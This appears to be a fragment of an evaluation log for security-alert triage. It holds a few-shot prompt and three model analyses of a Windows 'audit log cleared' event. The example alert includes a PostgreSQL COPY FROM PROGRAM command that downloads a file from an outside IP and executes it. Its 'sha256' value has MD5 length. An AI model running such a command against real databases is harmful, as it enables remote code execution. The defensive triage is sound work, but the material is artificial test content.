---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T07:58:12Z\",\n  \"severity\": \"critical\",\n  \"source\": \"PostgreSQL\",\n  \"event_type\": \"statement\",\n  \"message\": \"Potential abuse of COPY FROM PROGRAM function – PostgreSQL process calls shell to download and execute external file.\",\n  \"details\": {\n    \"host\": \"PG-SRV-01\",\n    \"database\": \"app_db\",\n    \"user\": \"app_user\",\n    \"client_ip\": \"198.51.100.72\",\n    \"session_id\": \"5fd9.2345\",\n    \"statement\": \"COPY pg_temp FROM PROGRAM 'curl -s 159.223.123.175:36287/JzICbeMxNQHwfwHLiCOFnumixtqYBv -o /tmp/pg_core && chmod +x /tmp/pg_core && /tmp/pg_core';\",\n    \"function\": \"COPY FROM PROGRAM\",\n    \"network_destination\": \"159.223.123.175:36287\",\n    \"sha256_ioc\": \"d41d8cd98f00b204e9800998ecf8427e\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nAt 07:58:12Z, a critical alert from the PostgreSQL server PG-SRV-01 was triggered. The app_user account sent a potentially malicious “COPY … FROM PROGRAM …” SQL query to the PostgreSQL server via the external IP address 198.51.100.72. This statement was used to download a shell program (/tmp/pg_core) from another external IP address (159.223.123.175) in the background (Parameter “-s” = silent mode) and then execute it directly (chmod +x).\n\nAssessment:\nThe fact that the app_user sends such an unusual request to the app_db database from outside the network suggests that this is an SQL injection on a public web server hosted on 198.51.100.72. An attacker could have been exploited a security vulnerability in a web application combined with a misconfiguration of the database permissions for the app_user, allowing to perform a remote code execution (RCE) attack on the database server and execute OS commands from a C2 server (159.223.123.175).\n\nRecommendation:\n1. Isolate both the database server PG-SRV-01 and the web server 198.51.100.72.\n2. Block the external C2 IP 159.223.123.175 at the perimeter firewall.\n3. Kill the pg_core process and preserve the pg_core file as well as the memory dump and logs from the isolated host to a secure forensic analysis environment and delete them from the host.\n4. Analyze the web server's (198.51.100.72) logs to identify the specific SQL injection vulnerability.\n5. Search all SIEM/EDR logs for the C2 IP and the file path /tmp/pg_core to find other compromised systems.\n\n-----------------------------------------------\nNow, analyze the following alert:\n\nINPUT ALERT:\n{alert}\n\nIDEAL ANALYSIS:"
        },
        {
          "role": "user",
          "content": "{\n  \"timestamp\": \"2024-06-15T03:22:10Z\",\n  \"severity\": \"critical\",\n  \"source\": \"WindowsEventLog:Security\",\n  \"event_id\": 1102,\n  \"message\": \"The audit log was cleared.\",\n  \"details\": {\n    \"host\": \"WIN-DC-BACKUP-01.corp.internal\",\n    \"subject_user_name\": \"adm_hford\",\n    \"subject_domain_name\": \"CORP\",\n    \"subject_logon_id\": \"0x4A12F\",\n    \"subject_user_sid\": \"S-1-5-21-39182741-19283742-10293843-1105\",\n    \"log_file_cleared\": \"Security\",\n    \"mitre_technique_id\": \"T1070.001\"\n  }\n}"
        }
      ],
      "prompt_token_count": 2127,
      "repetitions": [
        {
          "repetition_num": 1,
          "status": "Successful",
          "analysis": " Description:\nAt 03:22:10Z, a critical alert was triggered on the Windows host WIN-DC-BACKUP-01.corp.internal (CORP domain). The audit log in the Security event log was cleared by the administrator user adm_hford (SID: S-1-5-21-39182741-19283742-10293843-1105, Logon ID: 0x4A12F). This action is associated with the MITRE technique T1070.001, which refers to \"Clear Event Logs\".\n\nAssessment:\nThe clearing of the Security event log on a domain controller can be an attempt to hide malicious activities or cover up unauthorized actions. The administrator account involved in this action should not perform such operations without proper justification and approval. This incident requires immediate investigation as it may indicate an internal threat actor with elevated privileges, attempting to conceal their activities within the network.\n\nRecommendation:\n1. Investigate the motives behind the log clearing by reviewing the audit logs before they were cleared, if available.\n2. Identify the reason for the log clearing and determine whether it was a legitimate action or an attempt to cover up malicious activities.\n3. Review the actions of the administrator account (adm_hford) in the days leading up to this incident to identify any suspicious behavior.\n4. If necessary, place the adm_hford account on hold and conduct a thorough investigation before granting access again.\n5. Implement logging and alerting policies that notify administrators when critical logs are cleared or modified.",
          "reasoning": "",
          "duration_seconds": "50.79",
          "response_token_count": 373
        },
        {
          "repetition_num": 2,
          "status": "Successful",
          "analysis": " Description:\nA critical Windows security alert (Event ID 1102) was triggered on the host WIN-DC-BACKUP-01.corp.internal at 03:22:10Z, indicating that the Security audit log was intentionally cleared by the administrator account adm_hford (SID: S-1-5-21-39182741-19283742-10293843-1105).\n\nAssessment:\nThis action can be considered a high-severity incident, as it may indicate an attempt to cover up or destroy evidence of malicious activity. Clearing the Security audit log is associated with the MITRE ATT&CK technique T1070.001 (Clear Event Logs). If this action was performed in response to a security breach, it could potentially hinder the investigation and response efforts.\n\nRecommendation:\n1. Investigate the reasons behind the log clearing incident, including reviewing system logs before and after the event to identify any suspicious activities or potential signs of compromise.\n2. Notify the Incident Response team and relevant stakeholders about the incident.\n3. If possible, restore the cleared Security audit log from backup copies or other sources.\n4. Implement additional monitoring and alerting rules for future log clearing events.\n5. Review and update the organization's security policies regarding log retention and access controls to prevent similar incidents in the future.",
          "reasoning": "",
          "duration_seconds": "35.97",
          "response_token_count": 326
        },
        {
          "repetition_num": 3,
          "status": "Successful",
          "analysis": " Description:\nAt 03:22:10Z, a critical Windows security alert (Event ID 1102) was triggered on the host WIN-DC-BACKUP-01.corp.internal. The audit log for the Security event channel was cleared by the user adm_hford from the CORP domain.\n\nAssessment:\nThe clearing of the Windows Event Logs, specifically the Security logs, is a known technique used by attackers to hide their activities and evade detection (Mitre ATT&CK T1070.001). This action indicates that an unauthorized user or a compromised account with high privileges may have accessed the system and attempted to cover their tracks. The fact that this occurred on a domain controller backup server is concerning, as it could potentially impact the integrity of the organization's security logs across the entire Active Directory environment.\n\nRecommendation:\n1. Investigate the user account adm_hford and determine if there are any signs of unauthorized or suspicious activity.\n2. Review the backup logs to identify any potential data loss or corruption as a result of the log clearing event.\n3. Isolate the WIN-DC-BACKUP-01 host from the network for further investigation.\n4. Restore the Security event logs from a known good backup, if available.\n5. Notify relevant parties (Incident Response team, IT leadership) and initiate a thorough investigation to determine the root cause of the log clearing event and any potential data breach or compromise.",
          "reasoning": "",
          "duration_seconds": "36.84",
          "response_token_count": 333
        }
      ]
    },
